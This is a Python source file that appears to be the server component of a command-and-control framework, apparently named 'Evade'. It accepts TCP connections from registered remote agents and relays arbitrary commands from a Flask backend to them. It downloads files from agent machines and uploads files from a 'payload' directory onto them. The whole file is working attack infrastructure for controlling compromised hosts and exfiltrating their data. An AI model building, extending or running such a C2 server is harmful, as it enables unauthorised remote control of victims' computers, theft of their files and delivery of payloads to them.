import socket
import requests
import threading
import json
import os
from database import Session, Agent  # Assuming the existence of a database handling module

# Global dictionary to keep track of agent connections
agent_connections = {}
backend_connection = None
# Fixed port for receiving commands from the backend
COMMAND_PORT = 62347

def notify_flask_about_agent_connection(agent_id, agent_name,addr):
    url = 'http://localhost:5002/api/notify-agent-connection'
    data = {
        'agent_id': agent_id,
        'agent_name': agent_name,
        'addr' : addr
    }
    try:
        requests.post(url, json=data)
        print(f"Agent {agent_name} ({agent_id}) connected and notified to Flask app.")
    except requests.exceptions.RequestException as e:
        print(f"Failed to notify Flask app: {e}")

def handle_agent_connection(conn, addr):
    '''Handles connection with agents.'''
    try:
        # Receive agent ID
        agent_id = conn.recv(1024).decode()
        if agent_id:
            with Session() as session:
                # Check if the agent ID exists in the database
                agent = session.query(Agent).filter_by(agent_id=agent_id).first()
                if agent:
                    print(f"Agent {agent_id} recognized.")
                    agent_connections[agent_id] = conn
                    agent_name = agent.extra_data.get("name") 
                    print(agent_name)
                    '''Here i need to inform flask about connection with name not with the id.'''
                    notify_flask_about_agent_connection(agent_id, agent_name,addr)
                else:
                    print(f"Unrecognized agent: {agent_id}. Connection refused.")
                    conn.close()
        else:
            print("Agent ID not received.")
            conn.close()
    except Exception as e:
        print(f"Error handling agent connection: {e}")
        conn.close()

def handle_special_command(conn, agent_id, command):
    '''Handles special commands like download, upload, and cd.'''
    try:
        # Split the command to get the action and optional parameters
        cmd_parts = command.split(" ", 1)
        action = cmd_parts[0]
        if action == 'download':
            filename = cmd_parts[1] if len(cmd_parts) > 1 else ''
            handle_download(agent_id, filename)  # Corrected to match function signature
        elif action == 'upload' and len(cmd_parts) > 1:
            filename = cmd_parts[1]
            handle_upload(agent_id, filename)
        elif action == 'cd':
            directory = cmd_parts[1] if len(cmd_parts) > 1 else ''
            handle_change_directory(conn, directory)
        else:
            # Unsupported special command
            response = f"Unsupported special command: {action}"
            conn.send(response.encode())
    except Exception as e:
        print(f"Error handling special command: {e}")
        conn.close()

def handle_download(agent_id, filename):
    """
    Initiates a file download from the agent, handles receiving the file.
    """
    agent_conn = agent_connections.get(agent_id)
    if not agent_conn:
        print(f"No active connection for agent {agent_id}")
        return

    # Send the download command to the agent
    download_command = f"download {filename}"
    agent_conn.send(download_command.encode())

    # Await agent's response regarding the file's existence and size
    response = agent_conn.recv(2048).decode()

    if response == "File does not exist":
        print(f"Error: File does not exist on agent side - {agent_id}.")
        # Optionally, inform backend about the error
    elif response == "Is a directory":
        print(f"Error: Path is a directory, not a file - {agent_id}.")
    else:
        try:
            file_size = int(response)
            output_dir = 'downloaded_files'
            os.makedirs(output_dir, exist_ok=True)
            file_path = os.path.join(output_dir, os.path.basename(filename))

            with open(file_path, 'wb') as file:
                received_size = 0
                while received_size < file_size:
                    data = agent_conn.recv(2048)
                    if not data:
                        break  # Handle unexpected end of data
                    file.write(data)
                    received_size += len(data)

            response=f"Download of '{filename}' from {agent_id} completed."
            print(response)
            send_result_back_to_backend(response, agent_id)
        except ValueError:
            print(f"Invalid response for file size from agent {agent_id}.")

def handle_upload(agent_id, filename):
    """Handles the upload command, sending a file to the agent."""
    agent_conn = agent_connections.get(agent_id)
    if not agent_conn:
        print(f"No connection found for agent {agent_id}")
        return

    # Adjust the file_path to include the agent_id subdirectory
    uploads_dir = r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\back-end\payload\uploads'
    file_path = os.path.join(uploads_dir, agent_id, filename)  # Include the agent_id in the path

    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            # Inform the agent about the file size
            file_size = os.path.getsize(file_path)
            agent_conn.send(f"upload {filename} {file_size}".encode())
            
            # Wait for the agent to signal readiness
            response = agent_conn.recv(2048).decode()
            if response.strip() == "Ready for upload":
                # Start sending the file in chunks
                chunk = file.read(2048)
                while chunk:
                    agent_conn.send(chunk)
                    chunk = file.read(2048)

                # Wait for a confirmation response from the agent
                response = agent_conn.recv(2048).decode()
                if response.startswith("File Upload Successful"):
                    send_result_back_to_backend(response, agent_id)
                    print(f"Upload of '{filename}' to agent {agent_id} complete.")
                else:
                    print(f"Upload failed or agent {agent_id} was not ready. Response: {response}")
    else:
        print(f"Error: File {filename} not found for agent {agent_id}.")

def handle_change_directory(conn, directory):
    """Handles change directory command."""
    try:
        if directory:
            os.chdir(directory)
            response = f"Changed directory to {os.getcwd()}"
        else:
            response = "No directory specified"
    except Exception as e:
        response = f"Error changing directory: {str(e)}"
    conn.send(response.encode())

def handle_normal_command(conn, agent_id, command):
    '''Handles normal commands.'''
    # Send the command to the appropriate agent
    send_command_to_agent(agent_id, command)

def send_command_to_agent(agent_id, command):
    '''Forwards command to the appropriate agent.'''
    try:
        agent_conn = agent_connections.get(agent_id)
        if agent_conn:
            agent_conn.send(command.encode())
            print(f"Command sent to Agent {agent_id}: {command}")

            # Receive response from agent
            receive_agent_response(agent_conn, agent_id)
        else:
            print(f"No active connection found for Agent {agent_id}")
    except Exception as e:
        print(f"Error sending command to Agent {agent_id}: {e}")

def start_agent_listener(ip, port):
    """Listens for new agent connections."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((ip, port))
        s.listen()
        print(f"Listening for agent connections on {ip}:{port}")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_agent_connection, args=(conn, addr)).start()

def start_tcp_server(ip, agent_port):
    """Start the TCP server."""
    # Start listener for agents
    threading.Thread(target=start_agent_listener, args=(ip, agent_port)).start()

    # Start listener for backend commands
    threading.Thread(target=start_command_listener, args=('127.0.0.1', COMMAND_PORT)).start()

def start_command_listener(ip, port):
    """Listens for command dispatches from the backend."""
    global backend_connection 
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((ip, port))
        s.listen()
        print(f"Listening for command connections on {ip}:{port}")
        while True:
            conn, addr = s.accept()
            backend_connection = conn
            threading.Thread(target=handle_command_connection, args=(conn, addr)).start()
 
def receive_agent_response(conn, agent_id):
    '''Receives response from agent for the command sent.'''
    try:
        response = conn.recv(2048).decode().strip()
        if response:
            print(f"Response received from Agent {agent_id}: {response}")
            # Here, you can process the response as needed (e.g., send it back to the backend)
            send_result_back_to_backend(response, agent_id)
        else:
            print(f"No response received from Agent {agent_id}")
    except Exception as e:
        print(f"Error receiving response from Agent {agent_id}: {e}")

def send_result_back_to_backend(response, agent_id):
    global backend_connection  # Access the global variable
    if backend_connection:
        # Send the response back to the backend server
        backend_connection.send(json.dumps({"agent_id": agent_id, "response": response}).encode())
    else:
        print("Backend connection is not established.")

def handle_command_connection(conn, addr):
    """Handles connections for receiving commands from the backend."""
    try:
        command_data = conn.recv(1024).decode()
        if command_data:
            command_json = json.loads(command_data)
            agent_id = command_json.get('agent_id')
            command = command_json.get('command')
            # if this commnad is shutdown
            if agent_id and command:
                # Check if the agent connection exists
                agent_conn = agent_connections.get(agent_id)
                if agent_conn:
                    if command.startswith(('download', 'upload')):
                        handle_special_command(agent_conn, agent_id, command)
                    else:
                        handle_normal_command(agent_conn, agent_id, command)
                else:
                    print(f"No active connection found for Agent {agent_id}")
            else:
                print("Incomplete command data received from backend.")
        else:
            print("No command data received from backend.")
    except Exception as e:
        print(f"Error handling command connection: {e}")
        conn.close()
